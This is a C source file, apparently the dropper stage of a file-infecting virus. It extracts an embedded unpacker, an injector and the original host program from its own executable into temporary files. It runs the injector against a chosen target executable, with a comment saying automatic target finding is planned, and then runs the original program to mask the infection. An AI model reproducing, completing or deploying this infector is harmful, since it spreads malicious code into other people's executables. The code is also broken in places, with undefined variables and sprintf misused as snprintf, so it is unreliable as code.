#include <stdio.h>
#include <string.h>
#include <stdbool.h>


#include "utils.c"


#define UNPACKER_EXE_SIZE 391346
#define INJECTOR_EXE_SIZE 391346


bool unpack(const char *full_bin_path, char **unpacker, char **injector, char **original) {

    FILE *full_bin = fopen(full_bin_path, "rb");
    if (full_bin == NULL)
        return false;
    
    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *unpacker = tmpnam(NULL);
    if (*unpacker == NULL)
        return false;

    if (!read_into_file(self, *unpacker, UNPACKER_EXE_SIZE))
        return false;
    
    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *injector = tmpnam(NULL);
    if (*injector == NULL)
        return false;

    if (!read_into_file(self, *injector, INJECTOR_EXE_SIZE))
        return false;
    
    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *original = tmpnam(NULL);
    if (*original == NULL)
        return false;

    if (!read_into_file(self, *original, -1))
        return false;

    return true;
}


int main(int argc, char *argv[]) {

    if (argc < 2) {
        // targetfinding will be automatic soon!
        fprintf(stderr, "for now i need a TARGET to be specified");
        return 1;
    }

    char identifier[] = "OMG GUYS IM A STRING LOL-LOL-LOL";
    char *unpacker;
    char *injector;
    char *original;

    if (!unpack(argv[0], &unpacker, &injector, &original)) {
        perror(strerror(errno));
        return 1;
    }

    // 9 bc 2 spaces, 6 double quotes and a null terminator.
    size_t injector_cmd_size = L_tmpnam + L_tmpnam + FILENAME_MAX + 9;
    char *injector_cmd = malloc(injector_cmd_size);
    if (sprintf(injector_cmd, injector_cmd_size, "\"%s\" \"%s\" \"%s\"", injector, unpacker, target) < 0) {
        perror(strerror(errno));
        return 1;
    }
    system(injector_cmd);

    if (remove(injector)) {
        perror(strerror(errno));
        return 1;
    }
    
    // 3 bc 2 double quotes and a null terminator.
    size_t original_cmd_size = L_tmpnam + 3;
    char *original_cmd = malloc(original_cmd_size);
    if (sprintf(original_cmd, original_cmd_size, "\"%s\"", original) < 0) {
        perror(strerror(errno));
        return 1;
    }
    system(original_cmd);

    if (remove(original)) {
        perror(strerror(errno));
        return 1;
    }

    return 0;
}

